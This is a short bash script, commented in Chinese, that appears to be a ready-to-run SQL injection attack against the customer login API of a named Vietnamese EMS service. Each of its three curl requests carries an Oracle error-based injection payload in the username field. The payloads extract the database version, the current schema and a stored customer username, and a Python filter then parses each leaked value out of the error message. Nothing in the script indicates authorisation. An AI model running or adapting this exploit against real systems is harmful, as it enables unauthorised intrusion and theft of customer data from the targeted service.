#!/bin/bash
# EMS SQL注入 - 一键测试脚本

URL="https://customerconnect.ems.com.vn/api/User_Customer/Login"

echo "=== EMS SQL注入测试 ==="
echo ""

# 1. 获取Oracle版本
echo "[1] 数据库版本:"
curl -k -s -X POST "$URL" \
  -H "Content-Type: application/json" \
  -d '{"Username":"'"'"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND 1=CTXSYS.DRITHSX.SN(1,(SELECT BANNER FROM V$VERSION WHERE ROWNUM=1)))||'"'"'","Password":"test"}' \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('Message','').split('thesaurus ')[1].split(' does not')[0] if 'thesaurus' in d.get('Message','') else d)"

echo ""

# 2. 获取当前Schema
echo "[2] 当前Schema:"
curl -k -s -X POST "$URL" \
  -H "Content-Type: application/json" \
  -d '{"Username":"'"'"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND 1=CTXSYS.DRITHSX.SN(1,(SELECT USER FROM DUAL)))||'"'"'","Password":"test"}' \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('Message','').split('thesaurus ')[1].split(' does not')[0] if 'thesaurus' in d.get('Message','') else d)"

echo ""

# 3. 获取第一个用户名
echo "[3] 发现的用户名:"
curl -k -s -X POST "$URL" \
  -H "Content-Type: application/json" \
  -d '{"Username":"'"'"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND 1=CTXSYS.DRITHSX.SN(1,(SELECT USERNAME FROM USER_CUSTOMER WHERE ROWNUM=1)))||'"'"'","Password":"test"}' \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('Message','').split('thesaurus ')[1].split(' does not')[0] if 'thesaurus' in d.get('Message','') else d)"

echo ""
echo "=== 完成 ==="
